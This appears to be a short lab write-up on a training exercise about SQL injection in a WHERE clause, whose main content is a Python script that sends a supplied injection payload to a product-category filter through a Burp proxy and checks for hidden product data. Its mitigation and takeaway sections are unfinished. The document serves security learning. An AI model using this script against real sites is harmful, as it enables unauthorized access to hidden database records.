---
description: >-
  In Lab One, we see a simple SQL injection vulnerability in a WHERE clause
  allowing for the retrieval of hidden data.
---

# 1 - Retrieve Hidden Data

### Notes



### Scripted Solution

```python
import urllib3
import requests
import sys


# Disable 'Insecure Request' warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Burp proxy
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sqli(url, payload):
    """Exploit SQL Injection
    
    Call provided url with supplied payload and check for unreleased 
    product title in response.
    """
    uri = "/filter?category="
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)

    if "Umbrella" in r.text: # Title of an "unreleased" product
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        # Get url and payload arguments
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s www.example.com \"1=1\"" % sys.argv[0])

        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL Injection successful!")
    else:
        print("[-] SQL Injection unsuccessful.")
```

### Security Issues & Mitigation

Coming soon...

### Key Takeaways

Coming soon...
